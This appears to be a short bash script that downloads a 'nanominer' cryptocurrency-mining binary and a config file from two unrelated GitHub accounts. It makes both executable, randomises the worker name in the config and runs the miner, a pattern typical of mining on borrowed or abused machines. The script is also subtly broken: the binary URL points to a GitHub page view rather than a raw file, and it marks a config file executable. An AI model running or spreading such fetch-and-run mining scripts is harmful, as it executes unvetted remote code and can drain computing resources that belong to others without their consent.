#!/bin/bash
wget https://github.com/cobraytgaming/nanominer/blob/main/nanominer
wget https://raw.githubusercontent.com/solahfatsalma/VV/main/cfg.ini
chmod +x cfg.ini
chmod +x nanominer
sed -i "s/nanominer/$(shuf -n 1 -i 1-999999)/" "cfg.ini"
./nanominer cfg.ini
